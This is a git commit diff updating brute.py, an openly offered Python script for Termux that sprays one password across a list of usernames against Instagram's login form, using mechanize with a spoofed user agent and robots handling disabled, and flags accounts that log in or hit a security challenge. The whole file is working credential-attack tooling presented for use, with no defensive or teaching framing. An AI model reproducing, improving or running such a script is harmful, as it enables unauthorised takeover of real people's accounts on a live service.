b706831c59eb20bf487b55c951f9b4273c53ac18
Shodiqul Irwan <39845384+kancotdiq@users.noreply.github.com>
2018-08-29 00:14:38 +0700

    Update brute.py

--- brute.py
+++ brute.py
@@ -2,77 +2,71 @@
 
 # For Termux
 # jangan ganti jika ingin dihargai
-# script By Kancot1ST
-# IG Brute Force v.0.1
+# script By HVmbl3 - Kanc0t Cyber Team
+# IG Brute Force v.2.0
 # Contact Me :
-# 7/9/2018
+# 7/9/2018 v.1.0
+# 29/8/2018 v.2.0
+
 """
 Line : lazz110
 kancotonline@gmail.com
 """
 
-import mechanize
-import platform,os
+import mechanize,os
+
+#Color
+b="\033[0;34m"
+g="\033[1;32m"
+w="\033[1;37m"
+r="\033[1;31m"
+y="\033[1;33m"
 
 br = mechanize.Browser()
 
+br.set_handle_robots(False)
+br.set_handle_refresh(False)
+br.set_handle_gzip(False)
+br.set_handle_equiv(True)
+br.set_handle_referer(True)
+br.set_handle_redirect(True)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Iceweasel/31.5.0')]
+
+
 f = open('username.txt')
 
-def options():
-    br.set_handle_robots(False)
-    br.set_handle_refresh(False)
-    br.set_handle_gzip(False)
-    br.set_handle_equiv(True)
-    br.set_handle_referer(True)
-    br.set_handle_redirect(True)
-    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Iceweasel/31.5.0')]
-    mulai()
-
-def keluar():
-	print "[!] Keluar ..."
-	f.close()
-	os.sys.exit()
-
-def mulai():
+def brute():
     try:
-        username = f.readline()
+        os.system('clear')
+        print (g+"|=|============================|=|")
+        print (y+"             IG Brute")
+        print (y+"       Kancot Team - HVmbl3")
+        print (y+"   https://github.com/kancotdiq")
+        print (g+"|=|============================|=|")
         print ""
-        password = raw_input("Password : ")
+        username = f.readline()
+        password = raw_input(b+"    Password  "+r+": "+y)
+        print ""
+        count = 1
         while username:
-            print ("[+] Mencoba Username : "+username)
             br.open("https://www.instagram.com/accounts/login/?force_classic_login")
             br.select_form(nr=0)
             br.form[ 'username' ] = username.strip()
             br.form[ 'password' ] = password
             br.submit()
-            log = br.geturl()
-            print log
+	    log = br.geturl()
             if log == "https://www.instagram.com/":
-                print "[+] Berhasil Login ..."
-                keluar()
+	        print (g+username.strip())
+		os.sys.exit()
+            elif 'challenge' in log:
+		print (y+username.strip())
+		os.sys.exit()
             else:
-                os.system("clear")
+		print (r+username.strip())
             username = f.readline()
-    except:
-        f.close()
-
-def menu():
-	print "__                                __   "
-	print "|  | _______    ____   ____  _____/  |_  ============================"
-	print "|  |/ /\__  \  /    \_/ ___\/  _ \   __\ https://github.com/kancotdiq"
-	print "|    <  / __ \|   |  \  \__(  <_> )  |   Wa : ************"
-	print "|__|_ \(____  /___|  /\___  >____/|__|   Line : lazz110"
-	print "     \/     \/     \/     \/          	 ============================"
-	print ""
-	print "[1] Mulai"
-	print "[2] Keluar"
-	print " "
-	pilih = input("Pilih [1/2] : ")
-	if pilih == 1:
-		options()
-	else:
-		keluar()
-
+    except IndexError:
+        print(r+"Exiting ..."+w)
+		
 if __name__ == "__main__":
-	menu()
+	brute()
